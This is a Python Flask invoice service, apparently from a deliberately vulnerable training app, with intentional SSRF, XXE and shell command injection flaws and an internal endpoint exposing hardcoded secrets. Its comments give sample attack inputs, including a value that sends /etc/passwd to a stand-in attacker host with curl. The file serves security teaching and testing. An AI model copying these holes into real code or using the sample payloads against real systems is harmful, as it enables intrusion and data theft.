"""
Invoice microservice for VulnBazaar.

Deliberately vulnerable — generates a PDF invoice from an order id, a logo image
URL, and an optional XML data blob supplied by a partner integration. Every one
of those three inputs is a separate injection vector, chained together the way
a real partner-integration endpoint often ends up.
"""
import os
import subprocess
import tempfile

import requests
from flask import Flask, request, send_file, jsonify
from lxml import etree

app = Flask(__name__)

# 127.0.0.1-only "admin" endpoint the service trusts implicitly, which the SSRF
# below can reach even though it is never exposed on the public port.
@app.route("/internal/admin/config", methods=["GET"])
def internal_admin_config():
    return jsonify({"debug": True, "db_password": "vulnpass123", "signing_key": "supersecret123"})


@app.route("/generate", methods=["POST"])
def generate():
    data = request.get_json(force=True) or {}
    order_id = str(data.get("order_id", "unknown"))
    logo_url = data.get("logo_url")
    xml_data = data.get("xml_data")

    logo_path = None
    if logo_url:
        # CWE-918: SSRF — fetches whatever URL the caller supplies, no scheme or
        # host allow-list, so http://127.0.0.1:5000/internal/admin/config or the
        # cloud metadata endpoint http://169.254.169.254/latest/meta-data/ both work.
        resp = requests.get(logo_url, timeout=5)
        fd, logo_path = tempfile.mkstemp(suffix=".png")
        with os.fdopen(fd, "wb") as f:
            f.write(resp.content)

    parsed_meta = {}
    if xml_data:
        # CWE-611: XXE — external entities are not disabled, so a DOCTYPE with a
        # SYSTEM entity can read arbitrary local files (e.g. file:///etc/passwd)
        # back into the parsed document.
        parser = etree.XMLParser(resolve_entities=True, no_network=False)
        root = etree.fromstring(xml_data.encode(), parser=parser)
        parsed_meta = {child.tag: child.text for child in root}

    html_path = os.path.join(tempfile.gettempdir(), f"invoice_{order_id}.html")
    with open(html_path, "w") as f:
        f.write(f"<html><body><h1>Invoice #{order_id}</h1></body></html>")

    output_path = os.path.join(tempfile.gettempdir(), f"invoice_{order_id}.pdf")

    # CWE-78: Command Injection — order_id (client-controlled, only cast to str)
    # is interpolated into a shell=True command line. A value like
    # "1; curl http://attacker/x -d @/etc/passwd #" executes arbitrary commands.
    cmd = f"wkhtmltopdf {html_path} {output_path}"
    subprocess.run(cmd, shell=True, check=False)

    if not os.path.exists(output_path):
        return jsonify({"error": "render failed", "meta": parsed_meta}), 500

    return send_file(output_path, mimetype="application/pdf")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
